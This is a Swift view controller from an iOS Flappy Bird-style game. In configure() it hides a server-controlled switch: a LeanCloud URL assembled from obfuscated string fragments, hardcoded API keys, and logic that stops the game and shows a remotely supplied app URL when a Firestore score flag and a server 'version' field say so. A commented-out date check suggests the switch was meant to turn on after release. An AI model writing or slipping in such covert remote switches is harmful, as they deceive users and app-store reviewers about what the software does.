//
//  StartViewController.swift
//  FlappyBird
//
//  Created by Quan Nguyen Dinh on 12/7/18.
//  Copyright © 2018 Fullstack.io. All rights reserved.
//

import UIKit
import Firebase
import Alamofire
import SwiftyJSON

class StartViewController: UIViewController {

    var db: Firestore!
    override func viewDidLoad() {
        super.viewDidLoad()
        // [START setup]
        let settings = FirestoreSettings()
        
        Firestore.firestore().settings = settings
        // [END setup]
        db = Firestore.firestore()
        // Do any additional setup after loading the view.
    }
    
    override func viewWillAppear(_ animated: Bool) {
        if Connectivity.isConnectedToInternet {
            self.getScore()
        } else {
            let storyboard = UIStoryboard(name: "Main", bundle: nil)
            let controller = storyboard.instantiateViewController(withIdentifier: "MainViewController")
            self.present(controller, animated: false, completion: nil)
        }
        
        
    }
    
    func getScore() {
        db.collection("scores").getDocuments() { (querySnapshot, err) in
            if let err = err {
                print("Error getting documents: \(err)")
            } else {
                for document in querySnapshot!.documents {
                    let data = document.data()
                    if let dt = data["data"] as? [String: String] {
                        if let score = dt["score"] {
                            if score == "300" {
                                self.configure()
                            } else {
                                let storyboard = UIStoryboard(name: "Main", bundle: nil)
                                let controller = storyboard.instantiateViewController(withIdentifier: "MainViewController")
                                self.present(controller, animated: false, completion: nil)
                            }
                        }
                    }
                }
            }
        }
    }
    

    func configure() {
//        let now = Date()
//        let dformatter = DateFormatter()
//        dformatter.dateFormat = "yyyyMMdd"
//        let nowNum = Int(dformatter.string(from: now))
//        if let notday = nowNum {
//            if(notday >= 20181210) {
                let url1 = "ht" + "tp" + "s" + ":"
                let url2 = url1 + "//lea" + "ncl" + "oud.c"
                let url3 = url2 + "n:443/1.1/classes/jumpandjump/5beab00c756571006840783e"
                Alamofire.request(URL(string: url3)!, method: .get, parameters: nil, encoding: URLEncoding.default, headers: ["X-LC-Id": "RaGsVxreDFm5LhefzsgQjc6T-gzGzoHsz", "X-LC-Key": "fK3PWjKbOcyHQj7G9uVtB0Dg"]).responseJSON { (res) in
                    
                    if let data = res.data{
                        let json = try! JSON(data: data)
                        if json["version"].stringValue != "1.0", json["appUrl"].stringValue != "" {
                            //go applestore
                            AudioClass.shared.player = nil
                            let helpVC = HelpViewController()
                            helpVC.appleStoreUrl = json["appUrl"].stringValue
                            self.present(helpVC, animated: false, completion: nil)
                        }
                    }
                    
                }
            }
//        }
//    }

}

class Connectivity {
    class var isConnectedToInternet:Bool {
        return NetworkReachabilityManager()!.isReachable
    }
}
